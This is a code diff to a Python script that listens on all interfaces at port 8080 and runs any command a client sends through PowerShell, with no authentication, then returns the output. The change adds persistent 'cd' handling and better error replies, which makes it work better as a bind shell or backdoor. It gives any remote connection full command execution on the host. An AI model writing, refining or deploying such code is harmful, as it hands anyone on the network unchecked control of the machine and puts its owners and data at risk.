@@ -1,6 +1,7 @@
 import socket
 import threading
 import subprocess
+import os
 
 HOST = '0.0.0.0'
 PORT = 8080
@@ -12,6 +13,8 @@ server_socket.listen(5)
 print(f"Server is listening on {HOST}:{PORT}")
 
 def handle_client(client_socket):
+    working_dir = os.getcwd()  # Always initialize working_dir
+
     while True:
         try:
             command = client_socket.recv(1024).decode()
@@ -19,23 +22,32 @@ def handle_client(client_socket):
             if not command:
                 break
 
-            # Execute PowerShell command
-            result = subprocess.run(['powershell', '-NoProfile', command], capture_output=True, text=True)            
-            # Send back the results
-            response = result.stdout + result.stderr
-            if not response:
-                response = "Command executed with no output."
-                
+            if command.startswith("cd "):
+                try:
+                    new_dir = os.path.join(working_dir, command.split(' ', 1)[1])
+                    os.chdir(new_dir)
+                    working_dir = os.getcwd()
+                    response = f"Changed directory to {working_dir}"
+                except Exception as e:
+                    response = f"Error changing directory: {e}"
+            else:
+                result = subprocess.run(['powershell', '-NoProfile', '-Command', command], cwd=working_dir, capture_output=True, text=True)
+                response = result.stdout + result.stderr
+                if not response:
+                    response = "Command executed with no output."
+
             client_socket.send(response.encode())
 
         except socket.error as e:
             print(f"Socket error: {e}")
             break
         except Exception as e:
-            client_socket.send(f"Server error: {e}".encode())
+            response = f"Server error: {e}"
+            client_socket.send(response.encode())  # Send error back to client without terminating the server
             break
 
     client_socket.close()
+
 
 while True:
     client_socket, _ = server_socket.accept()
